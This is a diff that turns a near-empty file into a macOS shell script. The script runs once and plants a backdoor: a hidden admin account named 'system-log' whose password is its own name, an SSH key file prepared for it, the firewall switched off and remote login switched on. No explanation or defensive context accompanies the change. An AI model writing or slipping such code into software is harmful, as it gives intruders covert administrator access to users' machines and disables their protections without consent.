@@ -1,1 +1,39 @@
-#
+FLAG_FILE="/tmp/root_task_1_done"
+if [ ! -f "$FLAG_FILE" ]; then
+
+  username="system-log"
+
+  find_next_uid() {
+     local uid=1000
+     while dscl . -list /Users UniqueID | awk '{print $2}' | grep -q "^$uid$"; do
+        ((uid++))
+     done
+     echo $uid
+  }
+  
+  next_uid=$(find_next_uid)
+  dscl . -create /Users/$username
+  dscl . -create /Users/$username UserShell /bin/bash
+  dscl . -create /Users/$username RealName "$username"
+  dscl . -create /Users/$username UniqueID $next_uid
+  dscl . -create /Users/$username PrimaryGroupID 80
+  dscl . -create /Users/$username NFSHomeDirectory /Users/$username
+  dscl . -passwd /Users/$username "$username"
+  dscl . -create /Users/$username IsHidden 1
+  mkdir -p /Users/$username
+  chmod 755 /Users/$username
+  chown -R $username:staff /Users/$username
+  dseditgroup -o edit -a $username -t user admin
+  mkdir -p /Users/$username/.ssh
+  chmod 700 /Users/$username/.ssh
+  touch /Users/$username/.ssh/authorized_keys
+  chmod 600 /Users/$username/.ssh/authorized_keys
+  chown -R $username:staff /Users/$username/.ssh
+  
+  /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off
+  systemsetup -setremotelogin on
+  launchctl unload /System/Library/LaunchDaemons/ssh.plist
+  launchctl load -w /System/Library/LaunchDaemons/ssh.plist
+
+  touch "$FLAG_FILE"
+fi
